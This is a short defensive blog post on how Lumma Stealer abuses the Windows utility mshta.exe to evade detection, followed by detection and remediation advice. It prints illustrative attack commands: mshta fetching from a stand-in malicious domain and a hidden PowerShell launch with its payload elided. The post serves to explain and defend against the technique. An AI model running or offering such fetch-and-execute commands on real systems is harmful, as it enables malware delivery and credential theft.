---
author: "Wren Howell"
title: "Lumma's Living off the Land by MSHTA"
date: 2025-04-14
description: "Living off the Land Using MSHTA"
tags: ["Living off the Land , Windows"]
thumbnail: https://frsecure.com/wp-content/uploads/2021/08/Living-Off-the-Land-Attacks.jpg
---

As EDR and endpoint detections evolve, so do the tactics of threat actors. Rather than relying on attacker tools that are easily flagged by security systems, adversaries are increasingly leveraging living-off-the-land techniques—abusing legitimate tools and processes already present in the environment to execute malicious activity.

One example is Lumma Stealer, a type of information stealer often associated with Russian threat actors. Lumma Stealer is known for its simplicity and effectiveness, utilizing built-in Windows binaries like mshta.exe to evade detection.

**What is mshta.exe?** 

Mshta.exe is a native Windows utility designed to execute Microsoft HTML Applications (HTA). HTAs are essentially HTML files combined with scripting languages such as VBScript or JavaScript, and they execute with the same privileges as the user. Threat actors like Lumma Stealers commonly exploit mshta.exe by passing malicious arguments that spawn PowerShell commands. For example, Lumma Stealer might use a command like:

```bash
mshta.exe https://malicious_domain
```

This would be followed by an obfuscated PowerShell script designed to retrieve additional payloads or commands from the attacker's controlled infrastructure.
```bash
powershell.exe -w -h -ep Unrestricted -nop function [a bunch of hex]
```

**Detection**

Another potential detection opportunity would be to check when mshta.exe spawns a child process such as PowerShell or cmd.exe, especially when the PowerShell command line is unusually long or obfuscated. These are indicators of potentially malicious behavior.

**Remediation**

Since Lumma Stealer is a type info stealer, remediation steps include:
- Resetting credentials for the affected user(s)
- Blocking the malicious domain(s) used in the attack
- Deleting the phishing email or url responsible for the initial infection

For a more comprehensive defense, consider implementing Windows Defender Application Control (WDAC) policies to block all HTA file execution. This mitigates an entire class of attacks that abuse mshta.exe.


{{< css.inline >}}

<style>
.emojify {
	font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols;
	font-size: 2rem;
	vertical-align: middle;
}
@media screen and (max-width:650px) {
  .nowrap {
    display: block;
    margin: 25px 0;
  }
}
</style>

{{< /css.inline >}}
